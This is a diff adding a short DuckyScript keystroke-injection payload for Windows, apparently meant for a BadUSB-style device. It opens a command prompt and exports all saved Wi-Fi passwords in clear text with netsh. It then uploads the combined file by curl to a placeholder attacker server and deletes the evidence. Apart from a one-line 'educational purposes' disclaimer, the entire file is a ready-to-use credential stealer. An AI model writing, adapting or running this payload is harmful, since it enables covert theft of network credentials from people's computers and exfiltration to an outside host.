@@ -1,0 +1,27 @@
+REM Windows Wifi password stealer only for Educational purposes.
+DELAY 100
+GUI r
+DELAY 100
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd %temp%
+ENTER
+DELAY 1000
+REM exports the wifi passwords as XML
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 1000
+REM put all in 1 file
+STRING type *.xml >> flipme.xml
+ENTER
+DELAY 1000
+REM copys the files to host, use the postMe server or write something yourself.
+STRING curl -X POST -F "file=@%temp%/flipme.xml"  http://SERVER:PORT/upload
+ENTER
+DELAY 1000
+STRING del flipme.xml
+ENTER
+DELAY 1000
+STRING exit
+ENTER
